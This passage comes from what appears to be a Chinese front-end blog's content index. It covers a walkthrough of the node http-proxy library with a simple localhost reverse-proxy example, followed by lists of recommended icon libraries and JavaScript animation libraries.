class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>),</span><br><span class="line">    httpProxy = <span class="built_in">require</span>(<span class="string">&#x27;http-proxy&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Create a proxy server with custom application logic</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> proxy = httpProxy.<span class="title function_">createProxyServer</span>(&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Create your custom server and just call `proxy.web()` to proxy</span></span><br><span class="line"><span class="comment">// a web request to the target passed in the options</span></span><br><span class="line"><span class="comment">// also you can use `proxy.ws()` to proxy a websockets request</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> server = http.<span class="title function_">createServer</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="comment">// You can define here your custom logic to handle the request</span></span><br><span class="line">  <span class="comment">// and then proxy the request.</span></span><br><span class="line">  proxy.<span class="title function_">web</span>(req, res, &#123; <span class="attr">target</span>: <span class="string">&#x27;http://127.0.0.1:5060&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listening on port 5050&quot;</span>)</span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">5050</span>);</span><br></pre></td></tr></table></figure><p>目录结构<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589184406366-528ed49a-6443-4115-939f-9f256d94ac77.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589184406366-528ed49a-6443-4115-939f-9f256d94ac77.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>http-proxy.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">ProxyServer</span> = <span class="built_in">require</span>(<span class="string">&#x27;./http-proxy/index.js&#x27;</span>).<span class="property">Server</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createProxyServer</span>(<span class="params">options</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ProxyServer</span>(options);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">ProxyServer</span>.<span class="property">createProxyServer</span> = createProxyServer;</span><br><span class="line"><span class="title class_">ProxyServer</span>.<span class="property">createServer</span>      = createProxyServer;</span><br><span class="line"><span class="title class_">ProxyServer</span>.<span class="property">createProxy</span>       = createProxyServer;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title class_">ProxyServer</span>;</span><br></pre></td></tr></table></figure><p>.&#x2F;http-proxy&#x2F;index.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> httpProxy = <span class="variable language_">module</span>.<span class="property">exports</span>,</span><br><span class="line">    extend    = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>).<span class="property">_extend</span>,</span><br><span class="line">    parse_url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>).<span class="property">parse</span>,</span><br><span class="line">    <span class="title class_">EE3</span>       = <span class="built_in">require</span>(<span class="string">&#x27;eventemitter3&#x27;</span>),</span><br><span class="line">    http      = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>),</span><br><span class="line">    https     = <span class="built_in">require</span>(<span class="string">&#x27;https&#x27;</span>),</span><br><span class="line">    web       = <span class="built_in">require</span>(<span class="string">&#x27;./passes/web-incoming&#x27;</span>),</span><br><span class="line">    ws        = <span class="built_in">require</span>(<span class="string">&#x27;./passes/ws-incoming&#x27;</span>);</span><br><span class="line"></span><br><span class="line">httpProxy.<span class="property">Server</span> = <span class="title class_">ProxyServer</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createRightProxy</span>(<span class="params">type</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">options</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">req, res <span class="comment">/*, [head], [opts] */</span></span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> passes = (type === <span class="string">&#x27;ws&#x27;</span>) ? <span class="variable language_">this</span>.<span class="property">wsPasses</span> : <span class="variable language_">this</span>.<span class="property">webPasses</span>,</span><br><span class="line">          args = [].<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>),</span><br><span class="line">          cntr = args.<span class="property">length</span> - <span class="number">1</span>,</span><br><span class="line">          head, cbl;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* optional args parse begin */</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">typeof</span> args[cntr] === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        cbl = args[cntr];</span><br><span class="line"></span><br><span class="line">        cntr--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> requestOptions = options;</span><br><span class="line">      <span class="keyword">if</span>(</span><br><span class="line">        !(args[cntr] <span class="keyword">instanceof</span> <span class="title class_">Buffer</span>) &amp;&amp;</span><br><span class="line">        args[cntr] !== res</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="comment">//Copy global options</span></span><br><span class="line">        requestOptions = <span class="title function_">extend</span>(&#123;&#125;, options);</span><br><span class="line">        <span class="comment">//Overwrite with request options</span></span><br><span class="line">        <span class="title function_">extend</span>(requestOptions, args[cntr]);</span><br><span class="line"></span><br><span class="line">        cntr--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(args[cntr] <span class="keyword">instanceof</span> <span class="title class_">Buffer</span>) &#123;</span><br><span class="line">        head = args[cntr];</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      [<span class="string">&#x27;target&#x27;</span>, <span class="string">&#x27;forward&#x27;</span>].<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> requestOptions[e] === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">          requestOptions[e] = <span class="title function_">parse_url</span>(requestOptions[e]);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!requestOptions.<span class="property">target</span> &amp;&amp; !requestOptions.<span class="property">forward</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">emit</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Must provide a proper URL as target&#x27;</span>));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; passes.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(passes[i](req, res, requestOptions, head, <span class="variable language_">this</span>, cbl)) &#123; <span class="comment">// passes can return a truthy value to halt the loop</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">httpProxy.<span class="property">createRightProxy</span> = createRightProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ProxyServer</span>(<span class="params">options</span>) &#123;</span><br><span class="line">  <span class="title class_">EE3</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line">  options = options || &#123;&#125;;</span><br><span class="line">  options.<span class="property">prependPath</span> = options.<span class="property">prependPath</span> === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">web</span> = <span class="variable language_">this</span>.<span class="property">proxyRequest</span>           = <span class="title function_">createRightProxy</span>(<span class="string">&#x27;web&#x27;</span>)(options);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">ws</span>  = <span class="variable language_">this</span>.<span class="property">proxyWebsocketRequest</span>  = <span class="title function_">createRightProxy</span>(<span class="string">&#x27;ws&#x27;</span>)(options);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">options</span> = options;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">webPasses</span> = <span class="title class_">Object</span>.<span class="title function_">keys</span>(web).<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">pass</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> web[pass];</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">wsPasses</span> = <span class="title class_">Object</span>.<span class="title function_">keys</span>(ws).<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">pass</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ws[pass];</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="variable language_">this</span>.<span class="property">onError</span>, <span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>).<span class="title function_">inherits</span>(<span class="title class_">ProxyServer</span>, <span class="title class_">EE3</span>);</span><br></pre></td></tr></table></figure><p>结构</p><p><code>ProxyServer.createServer</code> 创建使用<br /><code>ProxyServer.createServer</code>  等价 <code>createProxyServer</code> <br /><code>createProxyServer</code>  返回一个 <code>ProxyServer</code> 实例</p><p>ProxyServer<br /><code>ProxyServer</code>  拥有web属性<br />web属性 <code>createRightProxy</code> 支持 <code>http</code> ， <code>https</code> ， <code>webscoket</code> <br />轮询方法 <code>deleteLength</code> ， 设置 <code>content-length</code> <code>timeout</code> <code>XHeaders</code> <code>stream</code>   核心方法<br />处理 <code>http.request</code>   核心模块 <code>pipe</code>  <code>response</code></p><p>下面列出来他的核心方法。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589178555827-8d83ed48-4e64-4925-bbbe-fb9f9630a45e.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589178555827-8d83ed48-4e64-4925-bbbe-fb9f9630a45e.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="732dc02e"></a></p><h2 id="带你动手撸一个"><a href="#带你动手撸一个" class="headerlink" title="带你动手撸一个"></a>带你动手撸一个</h2><p>以下是我们代理的主要流程思路。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589178555669-7961c2a1-810e-44d6-a031-f517091f264e.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589178555669-7961c2a1-810e-44d6-a031-f517091f264e.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>api.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">createServer</span>(<span class="keyword">function</span> (<span class="params">request, response</span>) &#123;</span><br><span class="line">    response.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">    response.<span class="title function_">write</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">huayifeng</span>: <span class="number">1</span>&#125;));</span><br><span class="line">    response.<span class="title function_">end</span>();</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8081</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br></pre></td></tr></table></figure><p>index.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">createServer</span>(<span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="title function_">proxy</span>(req, res);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8080</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">proxy</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> options = &#123;</span><br><span class="line">        <span class="attr">hostname</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="attr">port</span>: <span class="number">8081</span>,</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> proxyReq = http.<span class="title function_">request</span>(options);  </span><br><span class="line"></span><br><span class="line">    proxyReq.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;problem with request: &#x27;</span> + e.<span class="property">message</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">     </span><br><span class="line">    proxyReq.<span class="title function_">on</span>(<span class="string">&#x27;response&#x27;</span>, <span class="keyword">function</span>(<span class="params">proxyRes</span>) &#123;</span><br><span class="line">        proxyRes.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;end&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        proxyRes.<span class="title function_">pipe</span>(res);</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    proxyReq.<span class="title function_">end</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就简易实现了一个代理。当你访问localhost:8080 请求已经被代理到localhost:8081了。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图标库</title>
      <link href="/2019/05/16/frontend/collection/wheel/tu-biao-ku/"/>
      <url>/2019/05/16/frontend/collection/wheel/tu-biao-ku/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="uVpIM"></a></p><h1 id="1-IconPark"><a href="#1-IconPark" class="headerlink" title="1. IconPark"></a>1. IconPark</h1><p>IconPark 提供超过 2400 个高质量图标，还提供了每个图标的含义和来源的描述，便于开发者使用。除此之外，该网站还可以自定义图标，这是与其他图标网站与众不同的地方。该图标库是字节跳动旗下的技术驱动图标样式的开源图标库。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1654763709432-d1005f7c-1be9-468e-a1bd-7c889613ce25.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1654763709432-d1005f7c-1be9-468e-a1bd-7c889613ce25.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/bytedance/iconpark">https://github.com/bytedance/iconpark</a><br><a name="utSN0"></a></p><h1 id="2-Font-Awesome"><a href="#2-Font-Awesome" class="headerlink" title="2. Font Awesome"></a><br />2. Font Awesome</h1><p>Font Awesome 提供了可缩放的矢量图标，可以使用CSS所提供的所有特性对它们进行更改，包括：大小、颜色、阴影或者其它任何支持的效果。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1654763943916-4c569392-0c51-4dd5-a9cb-6900270b200d.png?x-oss-process=image/resize,w_838,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1654763943916-4c569392-0c51-4dd5-a9cb-6900270b200d.png?x-oss-process=image/resize,w_838,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/FortAwesome/Font-Awesome">https://github.com/FortAwesome/Font-Awesome</a><br><a name="qcmQV"></a></p><h1 id="3-Ionicons"><a href="#3-Ionicons" class="headerlink" title="3. Ionicons"></a><br />3. Ionicons</h1><p>Ionicons 是一个完全开源的图标集，是知名混合开发框架 Ionic Framework 内置的图标库，包含 1300 个设计优雅、风格统一的高质量图标，能满足大多数的业务场景。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1654764121675-69522b19-59b6-4601-af04-26d20ea77eb9.png?x-oss-process=image/resize,w_792,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1654764121675-69522b19-59b6-4601-af04-26d20ea77eb9.png?x-oss-process=image/resize,w_792,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="F78kv"></a></p><h1 id="4-Bootstrap-Icons"><a href="#4-Bootstrap-Icons" class="headerlink" title="4. Bootstrap Icons"></a><br />4. Bootstrap Icons</h1><p>Bootstrap Icons 是 Bootstrap 开源的 SVG 图标库，此图标库起初专门针对其组件（从表单控件到导航）和文档进行定制设计和构建，现在可以免费用于任何项目。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1654764209164-bcbf319e-661e-4e3d-8099-760a316d24f6.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1654764209164-bcbf319e-661e-4e3d-8099-760a316d24f6.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="EN0eS"></a></p><h1 id="5-Unicons"><a href="#5-Unicons" class="headerlink" title="5. Unicons"></a><br />5. Unicons</h1><p>Unicons 是一套收录超过 4500 种图标的图标库，提供 SVG 矢量和图标字型（Iconfont）格式，使用者可以自订每个图标大小、颜色和颜色。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1654764499021-c3ec0e41-cb80-4383-bad2-7cc2198a1e54.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1654764499021-c3ec0e41-cb80-4383-bad2-7cc2198a1e54.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="nXUx0"></a></p><h1 id="6-Tabler-Icons"><a href="#6-Tabler-Icons" class="headerlink" title="6. Tabler Icons"></a><br />6. Tabler Icons</h1><p>Tabler Icons 是一组超过 1950 个免费的高质量 SVG 图标，可以在 Web 项目中用。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1654765090572-586b5285-63e4-4976-9b76-5ce960ac159d.png?x-oss-process=image/resize,w_860,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1654765090572-586b5285-63e4-4976-9b76-5ce960ac159d.png?x-oss-process=image/resize,w_860,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> 图标 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动画库</title>
      <link href="/2019/03/01/frontend/collection/wheel/dong-hua-ku/"/>
      <url>/2019/03/01/frontend/collection/wheel/dong-hua-ku/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>很多时候我们在开发前端页面时都会做一些动画效果来提升用户体验度和页面美观度，所以今天就来给大家推荐几个好用的JavaScript动画库，希望对各位小伙伴有所帮助！</p><p><a name="Z7TS0"></a></p><h1 id="Animate-css"><a href="#Animate-css" class="headerlink" title="Animate.css"></a>Animate.css</h1><p>animate.css 是一个使用CSS3的animation制作的动画效果的CSS集合，里面预设了很多种常用的动画，且使用非常简单。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643079212742-891d0237-e517-421b-9a94-444861644415.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643079212742-891d0237-e517-421b-9a94-444861644415.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="aYbml"></a></p><h1 id="Hover-css"><a href="#Hover-css" class="headerlink" title="Hover.css"></a><br />Hover.css</h1><p>Hover.css 是一套基于 CSS3 的鼠标悬停效果和动画，这些可以非常轻松的被应用到按钮、LOGO 以及图片等元素。所有这些效果都是只需要单一的标签，必要的时候使用 before 和 after 伪元素。因为使用了 CSS3 过渡、转换和动画效果，因此只支持 Chrome、Firefox 和 Safari 等现代浏览器。 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643885334717-b36150c7-6d61-4b57-b90f-38a7bce71cc7.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643885334717-b36150c7-6d61-4b57-b90f-38a7bce71cc7.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="bFOsx"></a></p><h1 id="Magic-css"><a href="#Magic-css" class="headerlink" title="Magic.css"></a><br />Magic.css</h1><p>Magic CSS3 Animations 动画是一款独特的CSS3动画特效包，可以自由地使用在网页中。只需简单的在页面上引入 CSS 文件: magic.css 或者压缩版本 magic.min.css 就可以使用了。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643885435396-2b5df028-041d-49b2-b136-de4214626b75.png?x-oss-process=image/resize,w_957,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643885435396-2b5df028-041d-49b2-b136-de4214626b75.png?x-oss-process=image/resize,w_957,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="wGOZ6"></a></p><h1 id="React-Spring"><a href="#React-Spring" class="headerlink" title="React Spring"></a><br />React Spring</h1><p>react-spring 是一个基于弹簧物理学的动画库，满足大多数与UI相关的动画需求，提供了足够灵活的工具，可以自信地将想法投射到不断变化的界面中。该库代表了一种现代动画方法。它继承了 animated 强大的插值和性能，以及 react-motion 的易用性。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643878102964-52cd623b-075c-4c0a-8eea-08e53a5b6922.png?x-oss-process=image/resize,w_957,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643878102964-52cd623b-075c-4c0a-8eea-08e53a5b6922.png?x-oss-process=image/resize,w_957,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="AxzNH"></a></p><h1 id="React-Reveal"><a href="#React-Reveal" class="headerlink" title="React Reveal"></a><br />React Reveal</h1><p>React Reveal 是一个用于 React 的高性能动画库。它占用空间小，专门为 ES6 中的 React 编写。可用于创建各种炫酷的滚动效果显示。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643878159451-b74c722e-4448-4035-8248-b15890802718.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643878159451-b74c722e-4448-4035-8248-b15890802718.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="UAcIs"></a></p><h1 id="Greensock"><a href="#Greensock" class="headerlink" title="Greensock"></a><br />Greensock</h1><p>GreenSock是一个JavaScript动画库，可轻松对HTML元素进行动画处理。 用于创建高性能，零依赖性，跨浏览器动画，声称在超过 400 万个网站中使用。 其具有一下特点：<br />●速度快，专门优化了动画性能，使之实现和css一样的高性能动画效果。<br />●轻量与模块化。模块化与插件式的结构保持了核心引擎的轻量，TweenLite包非常小(基本上低于7kb)。提供了TweenLite, TimelineLite, TimelineMax 和 TweenMax不同功能的动画模块，你可以按需使用。<br />●没有依赖。<br />●灵活控制。不用受限于线性序列，可以重叠动画序列，可以通过精确时间控制，灵活地使用最少的代码实现动画。<br />●任何对象都可以实现动画。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643878632425-50cff842-d447-4a33-8aa8-123d55826940.png?x-oss-process=image/resize,w_795,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1643878632425-50cff842-d447-4a33-8aa8-123d55826940.png?x-oss-process=image/resize,w_795,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="EMS0s"></a></p><h1 id="Velocity-js"><a href="#Velocity-js" class="headerlink" title="Velocity.js"></a><br />Velocity.js</h1><p>Velocity.js 是velocity模板语法的javascript实现。Velocity 是基于Java的模板引擎，广泛应用在阿里集 